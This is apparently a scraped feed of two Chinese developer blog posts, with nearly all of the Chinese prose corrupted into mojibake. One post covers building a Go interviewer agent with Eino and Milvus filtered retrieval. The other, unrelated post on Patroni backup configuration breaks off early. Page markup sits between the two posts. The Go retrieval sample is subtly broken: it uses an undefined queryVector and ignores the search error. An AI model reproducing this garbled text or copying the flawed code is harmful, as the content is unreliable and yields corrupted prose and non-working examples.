<p>åœ¨ Eino å‡ºç°ä¹‹å‰ï¼Œç”¨ Go å†™ AI åº”ç”¨é€šå¸¸é¢ä¸´ä¸‰ä¸ªé—®é¢˜ï¼š</p>
<ol>
<li><strong>ç¼–æ’æ··ä¹±</strong>ï¼šå¤šè½®å¯¹è¯ã€å·¥å…·è°ƒç”¨ï¼ˆFunction Callï¼‰ã€çŠ¶æ€æµè½¬å…¨é  <code>if-else</code> ç¡¬å†™ï¼Œä»£ç ä¸å¯ç»´æŠ¤ã€‚</li>
<li><strong>ç”Ÿæ€å‰²è£‚</strong>ï¼šæƒ³æ¥ä¸ªå‘é‡åº“ã€æƒ³æ¢ä¸ªå¤§æ¨¡å‹ï¼Œéƒ½éœ€è¦è‡ªå·±é€ è½®å­ã€‚</li>
<li><strong>è°ƒè¯•å›°éš¾</strong>ï¼šAgent ä¸ºä»€ä¹ˆæ­»å¾ªç¯äº†ï¼Ÿä¸ºä»€ä¹ˆæ²¡è°ƒå·¥å…·ï¼Ÿç¼ºä¹å¯è§†åŒ–çš„ Trace æ‰‹æ®µã€‚</li>
</ol>
<p>Eino çš„æ ¸å¿ƒè®¾è®¡ç†å¿µæ˜¯ <strong>Graphï¼ˆå›¾ç¼–æ’ï¼‰</strong>ã€‚å®ƒæŠŠ AI åº”ç”¨æŠ½è±¡æˆä¸€ä¸ªå›¾ï¼ŒèŠ‚ç‚¹ï¼ˆNodeï¼‰æ˜¯ç»„ä»¶ï¼Œè¾¹ï¼ˆEdgeï¼‰æ˜¯æµè½¬é€»è¾‘ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c17221dbb834e128a4d758f8ba085d8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546L5Lit6Ziz6K6yQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767597386&amp;x-signature=5br%2Fqr7iG%2BL2zq%2FDyNi9qCXjdz8%3D" alt="37c546f1cfb5445798e7f81fd290c365.webp" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-1">äºŒã€ ç¯å¢ƒå‡†å¤‡</h2>
<p>å…ˆåˆå§‹åŒ–ä¸€ä¸ª Go é¡¹ç›®ï¼Œå®‰è£…æ ¸å¿ƒä¾èµ–ã€‚
æ³¨æ„ï¼šEino ç›®å‰è¿­ä»£å¾ˆå¿«ï¼Œå»ºè®®ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">go get github.com/cloudwego/eino@latest
go get github.com/cloudwego/hertz@latest
go get github.com/milvus-io/milvus-sdk-go/v2
</code></pre>
<hr/>
<h2 data-id="heading-2">ä¸‰ã€ å®æˆ˜ï¼šæ„å»ºä¸€ä¸ªâ€œé¢è¯•å®˜ Agentâ€</h2>
<p>æˆ‘ä»¬ä¸ä»…è¦èŠå¤©ï¼Œè¿˜è¦è®© Agent å…·å¤‡<strong>é˜…è¯»ç®€å†</strong>å’Œ<strong>å‡ºé¢˜</strong>çš„èƒ½åŠ›ã€‚è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„ ReActï¼ˆReasoning + Actingï¼‰åœºæ™¯ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a5b02f4b133140afaab8aacc644cf147~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546L5Lit6Ziz6K6yQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767597386&amp;x-signature=671WVR89DlUKhs7qLDyK4bXR4VI%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">3.1 å®šä¹‰å·¥å…·ï¼ˆToolï¼‰</h3>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬å°è£…ä¸€ä¸ªâ€œç®€å†è§£æå·¥å…·â€ã€‚Eino å¯¹å·¥å…·çš„å®šä¹‰éå¸¸æ ‡å‡†ï¼Œå…¼å®¹ OpenAI çš„ Function Call æ ¼å¼ã€‚</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// tool/resume.go</span>
<span class="hljs-keyword">type</span> ResumeParams <span class="hljs-keyword">struct</span> {
    Url <span class="hljs-type">string</span> <span class="hljs-string">`json:"url" desc:"ç®€å†çš„ä¸‹è½½é“¾æ¥"`</span>
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetResumeInfoTool</span><span class="hljs-params">()</span></span> componenttool.BaseTool {
    <span class="hljs-keyword">return</span> &amp;componenttool.Tool{
        Name: <span class="hljs-string">"get_resume_info"</span>,
        Desc: <span class="hljs-string">"è§£æå€™é€‰äººçš„ç®€å† PDFï¼Œæå–æŠ€æœ¯æ ˆå’Œé¡¹ç›®ç»éªŒ"</span>,
        Func: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, params *ResumeParams)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) {
            <span class="hljs-comment">// è¿™é‡Œçœç•¥å…·ä½“çš„ PDF è§£æé€»è¾‘</span>
            <span class="hljs-comment">// çœŸå®é¡¹ç›®ä¸­å»ºè®®ä½¿ç”¨ OCR æˆ–å¤§æ¨¡å‹æå–</span>
            <span class="hljs-keyword">return</span> <span class="hljs-string">"å€™é€‰äººç†Ÿæ‚‰ Go, Eino, Milvus, Redis..."</span>, <span class="hljs-literal">nil</span>
        },
    }
}
</code></pre>
<h3 data-id="heading-4">3.2 ç¼–æ’ Agentï¼ˆæ ¸å¿ƒä»£ç ï¼‰</h3>
<p>æ¥ä¸‹æ¥ï¼Œä½¿ç”¨ Eino çš„ <code>NewChatModelAgent</code> æ¥ç¼–æ’ã€‚
æ³¨æ„çœ‹ <code>ToolsConfig</code> çš„é…ç½®ï¼Œè¿™é‡Œæˆ‘ä»¬æŠŠåˆšæ‰å®šä¹‰çš„å·¥å…·æŒ‚è½½è¿›å»äº†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d5a48831681f4d478a17041c30fb96da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546L5Lit6Ziz6K6yQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767597386&amp;x-signature=TMB60f2WXjRnpTDWAbcedPKyYY0%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// agent/interviewer.go</span>
<span class="hljs-keyword">import</span> (
    <span class="hljs-string">"github.com/cloudwego/eino/adk"</span>
    <span class="hljs-string">"github.com/cloudwego/eino/compose"</span>
)

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewInterviewerAgent</span><span class="hljs-params">(ctx context.Context, model chat.Model)</span></span> (adk.Agent, <span class="hljs-type">error</span>) {
    agent, err := adk.NewChatModelAgent(ctx, &amp;adk.ChatModelAgentConfig{
        Name: <span class="hljs-string">"TechInterviewer"</span>,
        <span class="hljs-comment">// System Promptï¼šäººè®¾æ³¨å…¥</span>
        Instruction: <span class="hljs-string">`ä½ æ˜¯ä¸€ä¸ªèµ„æ·± Go é¢è¯•å®˜ã€‚
                     1. å¿…é¡»å…ˆè°ƒç”¨ get_resume_info å·¥å…·è¯»å–ç®€å†ã€‚
                     2. æ ¹æ®ç®€å†ä¸­çš„æŠ€æœ¯æ ˆï¼ˆå¦‚ Eino, Hertzï¼‰è¿›è¡Œæ·±åº¦è¿½é—®ã€‚
                     3. ä¸è¦é—®åŸºç¡€å…«è‚¡æ–‡ï¼Œè¦é—®åœºæ™¯è®¾è®¡ã€‚`</span>,
        Model: model, <span class="hljs-comment">// åº•å±‚å¤§æ¨¡å‹ï¼ˆDeepSeek/OpenAIï¼‰</span>
        <span class="hljs-comment">// æŒ‚è½½å·¥å…·ç®±</span>
        ToolsConfig: adk.ToolsConfig{
            ToolsNodeConfig: compose.ToolsNodeConfig{
                Tools: []componenttool.BaseTool{
                    GetResumeInfoTool(),
                },
            },
        },
        <span class="hljs-comment">// å…³é”®ï¼šè®¾ç½®æœ€å¤§è¿­ä»£è½®æ•°ï¼Œé˜²æ­¢ Agent é™·å…¥æ­»å¾ªç¯</span>
        MaxIterations: <span class="hljs-number">15</span>,
    })
    <span class="hljs-keyword">return</span> agent, err
}
</code></pre>
<p><strong>ä»£ç è§£æ</strong>ï¼š
è¿™æ®µä»£ç è™½ç„¶çŸ­ï¼Œä½†å®ƒå·²ç»å®ç°äº†ä¸€ä¸ªå®Œæ•´çš„<strong>è‡ªä¸»æ™ºèƒ½ä½“</strong>ã€‚Eino æ¡†æ¶åœ¨åº•å±‚è‡ªåŠ¨å¤„ç†äº†ï¼š</p>
<ul>
<li>User Query -&gt; Model æ€è€ƒ</li>
<li>Model å†³å®šè°ƒå·¥å…· -&gt; è§£æå‚æ•° -&gt; æ‰§è¡Œ Tool</li>
<li>Tool Result -&gt; å›å¡«ç»™ Model -&gt; Model ç”Ÿæˆæœ€ç»ˆå›ç­”</li>
</ul>
<hr/>
<h2 data-id="heading-5">å››ã€ è¿›é˜¶ï¼šRAG æ··åˆæ£€ç´¢ï¼ˆHybrid Searchï¼‰</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec5b23c2cbbc44c984a93b0ae3c0f455~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546L5Lit6Ziz6K6yQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767597386&amp;x-signature=95AIdXvSVdHXrg6tDO8vlZ0XrlA%3D" alt="image.png" loading="lazy"/></p>
<p>å•çº¯çš„ Agent å®¹æ˜“äº§ç”Ÿå¹»è§‰ã€‚ä¸ºäº†ä¿è¯é¢è¯•é¢˜çš„ä¸“ä¸šæ€§ï¼Œæˆ‘ä»¬å¼•å…¥ <strong>Milvus</strong> åšçŸ¥è¯†åº“ã€‚
è¿™é‡Œåˆ†äº«ä¸€ä¸ª<strong>ç”Ÿäº§çº§ RAG</strong> çš„å…³é”®ç‚¹ï¼š<strong>æ··åˆæ£€ç´¢</strong>ã€‚</p>
<p>å¾ˆå¤šæ•™ç¨‹åªæ•™ä½ ç®— Vector Similarityï¼ˆå‘é‡ç›¸ä¼¼åº¦ï¼‰ï¼Œä½†åœ¨å®é™…ä¸šåŠ¡ä¸­ï¼Œæˆ‘ä»¬å¾€å¾€éœ€è¦ç»“åˆæ ‡é‡è¿‡æ»¤ï¼ˆæ¯”å¦‚åªæœâ€œä¸­çº§â€éš¾åº¦çš„é¢˜ï¼‰ã€‚</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// retrieval/milvus.go</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *RetrieverService)</span></span> Retrieve(ctx context.Context, query <span class="hljs-type">string</span>) ([]*schema.Document, <span class="hljs-type">error</span>) {
    <span class="hljs-comment">// 1. åŠ¨æ€æ„å»º Filter (æ ‡é‡è¿‡æ»¤)</span>
    <span class="hljs-comment">// å®é™…åœºæ™¯ä¸­ï¼Œè¿™ä¸ª filter å¯èƒ½æ¥è‡ªå‰ç«¯ä¼ å‚ï¼Œæˆ–è€…ç”± LLM æ„å›¾è¯†åˆ«ç”Ÿæˆ</span>
    expr := <span class="hljs-string">"category == 'Golang' &amp;&amp; difficulty == 'Hard'"</span>
    
    <span class="hljs-comment">// 2. è°ƒç”¨ Milvus SDK (å‘é‡æ£€ç´¢)</span>
    <span class="hljs-comment">// æ³¨æ„ï¼šEino çš„æ¥å£è®¾è®¡å…è®¸æˆ‘ä»¬é€ä¼ è¿™äº› option</span>
    searchParam, _ := entity.NewIndexAUTOINDEXSearchParam(<span class="hljs-number">1</span>)
    
    docs, err := s.client.Search(ctx, 
        s.collection, 
        <span class="hljs-literal">nil</span>, 
        expr, <span class="hljs-comment">// æ ¸å¿ƒï¼šåœ¨è¿™é‡Œä¼ å…¥æ ‡é‡è¿‡æ»¤è¡¨è¾¾å¼</span>
        []<span class="hljs-type">string</span>{<span class="hljs-string">"content"</span>}, 
        queryVector, 
        milvus.NewTopKMetricType(milvus.L2, <span class="hljs-number">5</span>), <span class="hljs-comment">// TopK</span>
        searchParam,
    )
    
    <span class="hljs-keyword">return</span> s.convertToEinoDocs(docs), <span class="hljs-literal">nil</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-6">äº”ã€ æ€§èƒ½å‹æµ‹ï¼šGo vs Python</h2>
<p>ä¸ºäº†éªŒè¯ Go + Eino çš„æ€§èƒ½ï¼Œæˆ‘ä»¬åšäº†ä¸€ä¸ªç®€å•çš„å‹æµ‹ï¼ˆQPS 100ï¼‰ã€‚</p>
<ul>
<li><strong>Python (LangChain)</strong>: CPU é£™å‡åˆ° 200%ï¼ŒP99 å»¶è¿Ÿæ³¢åŠ¨å¾ˆå¤§ï¼ˆå— GIL å½±å“ï¼‰ã€‚</li>
<li><strong>Go (Eino)</strong>: CPU ç¨³å®šåœ¨ 30%ï¼ŒP99 å»¶è¿Ÿéå¸¸å¹³æ»‘ã€‚</li>
</ul>
<p><strong>ç»“è®º</strong>ï¼šåœ¨ <strong>IO å¯†é›†å‹</strong> çš„ AI Agent åœºæ™¯ä¸‹ï¼ˆå¤§é‡çš„ HTTP è¯·æ±‚ã€æ•°æ®åº“è¯»å†™ï¼‰ï¼ŒGo çš„åç¨‹æœºåˆ¶ç®€ç›´æ˜¯é™ç»´æ‰“å‡»ã€‚</p>
<hr/>
<h2 data-id="heading-7">å…­ã€ æ€»ç»“ä¸æºç </h2>
<p>è¯•ç”¨ä¸‹æ¥ï¼ŒEino ç»™æˆ‘çš„æ„Ÿè§‰æ˜¯ï¼š<strong>å·¥ä¸šé£ã€æ‰å®</strong>ã€‚å®ƒæ²¡æœ‰ LangChain é‚£ä¹ˆå¤šèŠ±é‡Œèƒ¡å“¨çš„æ¦‚å¿µï¼Œä½†æ¯ä¸€ä¸ª API çš„è®¾è®¡éƒ½éå¸¸è´´åˆå¾®æœåŠ¡å¼€å‘çš„ç›´è§‰ã€‚</p>
<p>å¦‚æœä½ ä¹Ÿæ˜¯ Go å¼€å‘è€…ï¼Œæƒ³è½¬å‹ AI å·¥ç¨‹åŒ–ï¼Œå¼ºçƒˆå»ºè®®è¯•ä¸€ä¸‹ Einoã€‚å®ƒå¯èƒ½æ˜¯ç›®å‰ Go ç”Ÿæ€ä¸­<strong>å”¯ä¸€èƒ½æ‰“</strong>çš„ Agent æ¡†æ¶ã€‚</p>
<h4 data-id="heading-8"><strong>æºç è·å–</strong>ï¼š</h4>
<p>ä¸ºäº†æ–¹ä¾¿å¤§å®¶å­¦ä¹ ï¼Œæˆ‘æŠŠè¿™ä¸ª <strong>ã€é¢è¯•å§ã€‘</strong> é¡¹ç›®ï¼ˆGo + Eino + Hertz + Milvusï¼‰æ•´ç†äº†ä¸€ä¸ªå¼€æºç‰ˆæœ¬ã€‚
åŒ…å«ï¼š</p>
<ul>
<li>å®Œæ•´çš„ Eino Graph ç¼–æ’ä»£ç </li>
<li>Milvus æ··åˆæ£€ç´¢å®ç°</li>
<li>Redis å¼‚æ­¥é˜Ÿåˆ—å¤„ç†é€»è¾‘</li>
</ul>
<p>ğŸ‘‰ <strong>å…³æ³¨å…¬ä¼—å·ã€ç‹ä¸­é˜³ã€‘ï¼Œå›å¤â€œé¢è¯•å§â€å³å¯è·å– GitHub åœ°å€å’Œè¯¦ç»†æ–‡æ¡£ã€‚</strong></p>
<p>ä¹Ÿå¯ä»¥åœ¨è¯„è®ºåŒºäº¤æµä½ åœ¨ä½¿ç”¨ Eino æ—¶é‡åˆ°çš„å‘ï¼ŒçŸ¥æ— ä¸è¨€ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Patroni ä¸­å¤‡ä»½æ¢å¤å’Œæ•°æ®è¿ç§»]]></title>    <link>https://juejin.cn/post/7588733783572348966</link>    <guid>https://juejin.cn/post/7588733783572348966</guid>    <pubDate>2025-12-29T06:40:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588733783572348966" data-draft-id="7588711557500649522" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Patroni ä¸­å¤‡ä»½æ¢å¤å’Œæ•°æ®è¿ç§»"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-29T06:40:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é›¶_å®ˆå¢“äºº"/> <meta itemprop="url" content="https://juejin.cn/user/921845172013299"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Patroni ä¸­å¤‡ä»½æ¢å¤å’Œæ•°æ®è¿ç§»
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/921845172013299/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é›¶_å®ˆå¢“äºº
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T06:40:59.000Z" title="Mon Dec 29 2025 06:40:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Patroni ä¸­å¤‡ä»½æ¢å¤å’Œæ•°æ®è¿ç§»</h2>
<h3 data-id="heading-1">1. å¤‡ä»½æ¢å¤</h3>
<h4 data-id="heading-2">1.1 å¤‡ä»½ç­–ç•¥ä¸é…ç½®</h4>
<p>Patroni æ”¯æŒå¤šç§å¤‡ä»½æ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡é…ç½®æ–‡ä»¶çš„ bootstrap å’Œ postgresql éƒ¨åˆ†è¿›è¡Œå®šåˆ¶ã€‚ä¸»è¦çš„å¤‡ä»½æ¢å¤æœºåˆ¶åŒ…æ‹¬ï¼š</p>
<h5 data-id="heading-3">1.1.1 WAL-E äº‘å­˜å‚¨å¤‡ä»½</h5>
<p>WAL-E æ˜¯ä¸€ä¸ªå¼€æºçš„è¿ç»­å½’æ¡£å·¥å…·ï¼Œæ”¯æŒå°† WAL æ—¥å¿—å’ŒåŸºç¡€å¤‡ä»½å­˜å‚¨åˆ°äº‘å­˜å‚¨æœåŠ¡ï¼ˆå¦‚ AWS S3ã€Google Cloud Storage ç­‰ï¼‰ã€‚Patroni å†…ç½®äº† WAL-E æ¢å¤è„šæœ¬ï¼Œå¯ä»¥æ™ºèƒ½åœ°é€‰æ‹©ä»äº‘å­˜å‚¨æ¢å¤æˆ–ä½¿ç”¨ pg_basebackupã€‚</p>
<p>é…ç½®ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">postgresql:</span>
  <span class="hljs-attr">create_replica_methods:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">wal_e</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">basebackup</span>
  <span class="hljs-attr">wal_e:</span>
    <span class="hljs-attr">command:</span> <span class="hljs-string">patroni_wale_restore</span>
    <span class="hljs-attr">envdir:</span> <span class="hljs-string">/etc/wal-e.d/env</span>
    <span class="hljs-attr">use_iam:</span> <span class="hljs-number">1</span>
    <span class="hljs-attr">threshold_mb:</span> <span class="hljs-number">1024</span>
    <span class="hljs-attr">threshold_pct:</span> <span class="hljs-number">10</span>
  <span class="hljs-attr">basebackup:</span>
    <span class="hljs-attr">max-rate:</span> <span class="hljs-string">'100M'</span>
</code></pre>
<p>å‚æ•°è¯´æ˜ï¼š</p>
<ul>
<li>envdir: WAL-E ç¯å¢ƒå˜é‡ç›®å½•</li>
<li>use_iam: æ˜¯å¦ä½¿ç”¨ AWS IAM è§’è‰²è®¤è¯ï¼ˆ1 å¯ç”¨ï¼Œ0 ç¦ç”¨ï¼‰</li>
<li>threshold_mb: WAL å·®å¼‚é˜ˆå€¼ï¼ˆMBï¼‰ï¼Œè¶…è¿‡æ­¤å€¼åˆ™ä½¿ç”¨ pg_basebackup</li>
<li>threshold_pct: WAL å·®å¼‚ç™¾åˆ†æ¯”é˜ˆå€¼ï¼Œè¶…è¿‡æ­¤å€¼åˆ™ä½¿ç”¨ pg_basebackup</li>
</ul>
<h5 data-id="heading-4">1.1.2 pg_basebackup æ ‡å‡†å¤‡ä»½</h5>
<p>pg_basebackup æ˜¯ PostgreSQL è‡ªå¸¦çš„åŸºç¡€å¤‡ä»½å·¥å…·ï¼ŒPatroni é»˜è®¤ä½¿ç”¨æ­¤æ–¹æ³•åˆ›å»ºå‰¯æœ¬ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">postgresql:</span>
  <span class="hljs-attr">create_replica_methods:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">basebackup</span>
  <span class="hljs-attr">basebackup:</span>
    <span class="hljs-attr">max-rate:</span> <span class="hljs-string">'50M'</span>
    <span class="hljs-attr">checkpoint:</span> <span class="hljs-string">'fast'</span>
    <span class="hljs-attr">verbose:</span> <span class="hljs-literal">true</span>
</code></pre>
<h5 data-id="heading-5">1.1.3 Barman</h5>
<p>Barmanï¼ˆBackup and Recovery Manager for PostgreSQLï¼‰æ˜¯ä¸€ä¸ªç”¨äºç®¡ç† PostgreSQL æ•°æ®åº“å¤‡ä»½å’Œæ¢å¤çš„ç”Ÿäº§çº§å·¥å…·ï¼Œç‰¹åˆ«é€‚ç”¨äºé«˜å¯ç”¨æ€§æ¶æ„ã€‚è¦åœ¨ Patroni ä¸­ä½¿ç”¨ Barman ä½œä¸ºå¤‡ä»½æ–¹æ³•ï¼Œéœ€è¦åœ¨ <code>postgresql</code> é…ç½®å—ä¸­æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">postgresql:</span>
  <span class="hljs-attr">create_replica_methods:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">barman</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">basebackup</span>
  <span class="hljs-attr">barman:</span>
    <span class="hljs-attr">command:</span> <span class="hljs-string">patroni_barman</span> <span class="hljs-string">--api-url</span> <span class="hljs-string">https://barman-host:7480</span> <span class="hljs-string">recover</span>
    <span class="hljs-attr">barman-server:</span> <span class="hljs-string">my_server</span>
    <span class="hljs-attr">ssh-command:</span> <span class="hljs-string">ssh</span> <span class="hljs-string">postgres@patroni-host</span>
  <span class="hljs-attr">basebackup:</span>
    <span class="hljs-attr">max-rate:</span> <span class="hljs-string">'100M'</span>
</code></pre>
<p>å‚æ•°è¯´æ˜ï¼š</p>
<ul>
<li><code>command</code>: æŒ‡å®šç”¨äºæ¢å¤å¤‡ä»½çš„å‘½ä»¤ã€‚</li>
<li><code>barman-server</code>: æŒ‡å®š Barman æœåŠ¡å™¨çš„åç§°ã€‚</li>
<li><code>ssh-command</code>: æŒ‡å®šç”¨äºè¿æ¥åˆ° Patroni ä¸»æœºçš„ SSH å‘½ä»¤ã€‚</li>
<li><code>max-rate</code>: æŒ‡å®š <code>pg_basebackup</code> çš„æœ€å¤§é€Ÿç‡ã€‚</li>
</ul>
<h4 data-id="heading-6">1.2 æ¢å¤æµç¨‹ä¸æœºåˆ¶</h4>
<p>Patroni çš„æ¢å¤è¿‡ç¨‹é‡‡ç”¨å¤šçº§å›é€€ç­–ç•¥ï¼Œç¡®ä¿åœ¨å„ç§æ•…éšœæƒ…å†µä¸‹éƒ½èƒ½æˆåŠŸæ¢å¤ï¼š</p>
